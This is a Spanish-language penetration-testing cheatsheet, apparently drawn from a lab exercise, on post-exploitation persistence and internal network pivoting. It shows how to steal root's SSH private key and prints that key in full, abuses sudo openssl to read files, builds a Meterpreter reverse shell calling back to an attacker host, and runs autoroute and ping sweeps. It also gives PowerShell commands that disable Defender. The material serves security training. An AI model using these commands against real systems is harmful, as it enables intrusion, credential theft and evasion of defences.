
# Persistencia Post-Explotación

Una vez que hemos conseguido acceso a un objetivo, por ejemplo por SSH nuestro objetivo es crear persistencia para acceder en cualquier momento. Para ello:

1. Accedemos por SSH al objetivo
2. Elevamos privilegios a root en el host (para acceder siempre como root)
3. En el directorio `/root` accedemos a `.ssh` y copiamos el `id_rsa` en nuestro equipo atacante

```shell-session
afsh4ck@kali$ ssh srvadm@10.129.10.10

srvadm@dmz01:~$ cd /root/.ssh/
srvadm@dmz01:~$ cat id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
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
WNfJbbEPrmQf0AAAALcm9vdEB1YnVudHU=
-----END OPENSSH PRIVATE KEY-----
```

#### Si el objetivo tiene permisos openssl (bastante común)

{% embed url="<https://gtfobins.github.io/gtfobins/openssl/>" %}

```shell-session
srvadm@dmz01:~$ sudo -l

Matching Defaults entries for srvadm on dmz01:
  env_reset, mail_badpass,
  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User srvadm may run the following commands on dmz01:
  (ALL) NOPASSWD: /usr/bin/openssl
```

```shell-session
srvadm@dmz01:~$ LFILE=/root/.ssh/id_rsa
srvadm@dmz01:~$ sudo /usr/bin/openssl enc -in $LFILE

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA0ksXgILHRb0j1s3pZH8s/EFYewSeboEi4GkRogdR53GWXep7GJMI
oxuXTaYkMSFG9Clij1X6crkcWLnSLuKI8KS5qXsuNWISt+T1bpvTfmFymDIWNx4efR/Yoa
vpXx+yT/M2X9boHpZHluuR9YiGDMZlr3b4hARkbQAc0l66UD+NB9BjH3q/kL84rRASMZ88
y2jUwmR75Uw/wmZxeVD5E+yJGuWd+ElpoWtDW6zenZf6bqSS2VwLhbrs3zyJAXG1eGsGe6
<---SNIP--->
```

### Si no hay id\_rsa en el objetivo

Crear par de claves SSH en el host remoto con `ssh-keygen`:

```shell-session
srvadm@dmz01:~$ sudo su
root@dmz01:~# ssh-keygen -t rsa -b 4096 -f /root/.ssh/id_rsa -N ""
```

Este comando:

* Crea un par de claves (`id_rsa` y `id_rsa.pub`)
* **Sin passphrase** (`-N ""`)
* En `/root/.ssh/` (usa `-f` para la ruta)

✅ Ahora tienes un `id_rsa` privado que puedes copiar a tu Kali para tener acceso persistente como root sin especificar una contraseña.

***

## <mark style="color:purple;">Acceso a redes internas</mark>

### Localizar redes internas

Una vez que hemos accedido a un host podemos usar `ifconfig` en linux o `ipconfig` en windows para ver las redes disponibles. Las redes internas siempre suelen tener el formato `172.16.8.x` o similar:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>root@dmz01:~# ifconfig -a
</strong>
eth0: flags=4163&#x3C;UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.8.120  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:acff:fe11:2  prefixlen 64  scopeid 0x20&#x3C;link>
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
</code></pre>

### Configurar Pivoting SSH

#### 1. Habilitar Port Forwarding SSH con `-D 8081`

```bash
ssh -D 8081 -i dmz01_key root@10.129.10.10
```

#### 2. Añadir proxy Socks4 a `proxychains4.conf`

```bash
afsh4ck@kali$ sudo gedit /etc/proxychains4.conf 

#	socks4	192.168.1.49	1080
#       proxy types: http, socks4, socks5
socks4 	127.0.0.1 8081
```

#### 3. Utilizar proxychains para hacer pivoting a red interna, p.e. `172.16.8.120`

```bash
proxychains nmap -sT -p 21,22,80,8080 172.16.8.120
```

### Configurar Pivoting RDP

#### 1. Habilitar port forwarding con `-L 13389` apuntando al host interno `172.16.8.20` que tiene RDP habilitado

```bash
ssh -i dmz01_key -L 13389:172.16.8.20:3389 root@10.129.10.10
```

#### 2. Conexión con xfreerdp a `127.0.0.1:13389` que redirige a `172.16.8.20:3389`

```bash
xfreerdp /v:127.0.0.1:13389 /u:user /p:password /drive:home,"/home/kali/Escritorio/hack-tools/WINDOWS"
```

***

## <mark style="color:purple;">Enumeración interna</mark>

El objetivo es encontrar los **hosts activos** dentro de las subredes internas en el scope:

| Pruebas internas                                    |
| --------------------------------------------------- |
| `172.16.8.0/23` - Subred interna 1                  |
| `172.16.9.0/23` - Subred interna 2                  |
| `INLANEFREIGHT.LOCAL` (dominio de Active Directory) |

### Descubrimiento de hosts internos

#### Ping Sweep con Metasploit

{% hint style="info" %}
Debemos tener una sesión de Meterpreter abierta y llevarla al background
{% endhint %}

```shell-session
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.73 LPORT=443 -f elf > shell.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
```

```shell-session
$ msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST 10.10.14.73; set LPORT 443; run" 

[*] Using configured payload generic/shell_reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
LHOST => 10.10.14.73
LPORT => 443
[*] Started reverse TCP handler on 10.10.14.73:443 
```

Le damos permisos al ejecutable y lo ejecutamos:

```shell-session
root@dmz01:~# chmod +x shell.elf
root@dmz01:~# ./shell.elf
```

```
[*] Sending stage (1017704 bytes) to 10.129.229.147
[*] Meterpreter session 1 opened (10.10.14.73:443 -> 10.129.229.147:51856) at 2025-10-02 02:46:43 +0800

meterpreter > whoami
[-] Unknown command: whoami. Run the help command for more details.
meterpreter > getuid
Server username: root
```

Ahora configuramos `autoroute` con Metasploit, indicándole la `session` y la subnet a la que queremos acceder, p.e. `172.16.8.0`:

```bash
(Meterpreter 1)(/tmp) > background
[*] Backgrounding session 1...
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> use post/multi/manage/autoroute 

[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set SESSION 1
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set subnet 172.16.8.0
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.203.111
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.17.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.18.0.0/255.255.0.0 from host's routing table.
[*] Post module execution completed
```

* Una vez configurado el autoroute llevamos la session al background de nuevo y usamos el módulo de `ping_sweep` contra la subred interna:

```bash
(Meterpreter 1)(/tmp) > background
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> use post/multi/gather/ping_sweep
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> show options 

Module options (post/multi/gather/ping_sweep):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       IP Range to perform ping sweep against.
   SESSION                   yes       The session to run this module on

[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> set rhosts 172.16.8.0/23
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> set SESSION 1
[msf](Jobs:0 Agents:1) post(multi/gather/ping_sweep) >> run

[*] Performing ping sweep for IP range 172.16.8.0/23
[+] 	172.16.8.3 host found
[+] 	172.16.8.20 host found
[+] 	172.16.8.50 host found
[+] 	172.16.8.120 host found
```

#### Ping Sweep con bucle for

Cuando hemos accedido por SSH a un host o tenemos una reverse shell en el objetivo podemos ejecutar la siguiente línea para buscar hosts internos en la subred que le indiquemos, en este caso `172.16.8.x`

```shell-session
root@dmz01:~# for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from

64 bytes from 172.16.8.3: icmp_seq=1 ttl=128 time=0.472 ms
64 bytes from 172.16.8.20: icmp_seq=1 ttl=128 time=0.433 ms
64 bytes from 172.16.8.120: icmp_seq=1 ttl=64 time=0.031 ms
64 bytes from 172.16.8.50: icmp_seq=1 ttl=128 time=0.642 ms
```

#### Ping Sweep con Powershell

Si estamos dentro de un host Windows podemos hacer un ping sweep con Powershell. Esta técnica nos mostrará un True en los host activos dentro de la subred que le indiquemos, en este caso la segunda subred `172.16.9.x`

```powershell
*Evil-WinRM* PS C:\>  1..100 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}

|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK
172.16.9.1: False
172.16.9.2: False
172.16.9.3: True
172.16.9.4: False

<SNIP>

172.16.9.24: False
172.16.9.25: True
172.16.9.26: False
172.16.9.27: False

<SNIP>
```

### Enumeración con Powershell

```powershell
# Enumera todos los usuarios del dominio
Get-ADUser -Filter * | Select Name
 
# Mapeo de la red
Get-NetNeighbor | Where-Object {$_.State -eq "Reachable”}

# Ver administradores
net localgroup administrators

# Ver recursos compartidos de otro equipo
net view \\IP_del_equipo

# Muestra tu identidad, tokens y privilegios
whoami /all

# Ver archivos en los escritorios accesibles
dir \\equipo\C$\Users\*\Desktop

# Busca contraseñas en archivos
findstr /si password *.txt *.xml *.config

# Busca procesos sospechosos
Get-Process | Sort CPU -Descending

# Extrae el DNS cache
ipconfig /displaydns

# Desactiva el Defender
Set-MpPreference -DisableRealtimeMonitoring $true

# Descativa la política de ejecución de scripts
Set-ExecutionPolicy Bypass -Scope Process -Force
```

### Escaneo de hosts internos

Continuemos nuestra enumeración usando un [binario estático de Nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) en el host dmz01.

```shell-session
root@dmz01:~# sudo ./nmap -v --open -iL live_hosts
```

### Revisiones

En los hosts internos ver si hay el servicio NFS para montarlo como se explica en:

{% content-ref url="/pages/nMpJJamhBqyMwkLul7Wq" %}
[Recopilación de Información Interna](/ethical-hacking-cheatsheet/hacking-en-entornos-reales/enterprise-hacking/pruebas-internas/recopilacion-de-informacion-interna.md)
{% endcontent-ref %}

Esto nos puede dar alguna flag y archivo de configuración que pueden contener credenciales

### **Configurar proxy en el navegador**

Necesitamos configurar el proxy para navegar a sitios de la red interna:

<figure><img src="https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252FX5XvByGPPlIVMfKiD2ea%252Fenterprise-38.png%3Falt%3Dmedia%26token%3D2a490a99-73fd-438a-ba56-4ffb9c85ea18&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=86aaddea&#x26;sv=2" alt=""><figcaption></figcaption></figure>
